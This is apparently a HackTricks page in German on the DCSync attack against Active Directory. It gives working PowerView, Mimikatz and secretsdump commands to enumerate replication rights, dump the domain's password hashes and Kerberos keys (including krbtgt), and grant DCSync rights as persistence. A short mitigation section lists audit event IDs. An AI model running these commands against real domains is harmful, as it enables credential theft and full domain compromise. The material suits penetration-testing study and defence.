# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync**-Berechtigung impliziert, dass man diese Berechtigungen über die Domäne selbst hat: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.

**Wichtige Hinweise zu DCSync:**

- Der **DCSync-Angriff simuliert das Verhalten eines Domain Controllers und fordert andere Domain Controllers auf, Informationen zu replizieren** unter Verwendung des Directory Replication Service Remote Protocol (MS-DRSR). Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann es nicht deaktiviert oder abgeschaltet werden.
- Standardmäßig haben nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** die erforderlichen Berechtigungen.
- Wenn Passwörter von Konten mit umkehrbarer Verschlüsselung gespeichert sind, steht in Mimikatz eine Option zur Verfügung, um das Passwort im Klartext zurückzugeben.

### Enumeration

Überprüfen Sie, wer diese Berechtigungen hat, indem Sie `powerview` verwenden:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Lokal ausnutzen
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploitieren Sie aus der Ferne
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generiert 3 Dateien:

- eine mit den **NTLM-Hashes**
- eine mit den **Kerberos-Schlüsseln**
- eine mit Klartext-Passwörtern aus dem NTDS für alle Konten, bei denen [**umkehrbare Verschlüsselung**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Sie können Benutzer mit umkehrbarer Verschlüsselung mit

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistenz

Wenn Sie ein Domänenadministrator sind, können Sie diese Berechtigungen mit Hilfe von `powerview` jedem Benutzer gewähren:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Dann können Sie **überprüfen, ob der Benutzer korrekt** die 3 Berechtigungen zugewiesen bekam, indem Sie nach ihnen in der Ausgabe suchen (Sie sollten die Namen der Berechtigungen im Feld "ObjectType" sehen können):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Minderung

- Sicherheitsereignis-ID 4662 (Audit-Policy für Objekt muss aktiviert sein) – Eine Operation wurde an einem Objekt durchgeführt
- Sicherheitsereignis-ID 5136 (Audit-Policy für Objekt muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
- Sicherheitsereignis-ID 4670 (Audit-Policy für Objekt muss aktiviert sein) – Berechtigungen auf einem Objekt wurden geändert
- AD ACL Scanner - Erstellen und Vergleichen von Berichten über ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referenzen

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
